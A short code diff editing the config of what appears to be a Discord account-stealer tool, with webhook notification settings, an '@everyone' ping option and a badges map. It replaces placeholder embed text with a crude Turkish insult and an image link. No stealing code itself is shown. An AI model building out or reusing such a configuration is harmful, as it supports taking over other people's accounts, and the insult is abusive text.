@@ -22,16 +22,15 @@ var config = {
    notify_on_initialization: false,
    ping: [false, "@everyone"],
 
-
-    embed: {
-        username: "babayim",
-        footer: {
-            text: `zaaa`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
-        },
-        href: "zaaa",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
-    },
+   embed: {
+       username: "babayim",
+       footer: {
+           text: `ananizi siktim laa`,
+           icon_url: "https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg",
+       },
+       href: "https://ataturkolmedi",
+       avatar_url: "https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg"
+   },
 
    badges: {
        Discord_Employee: {
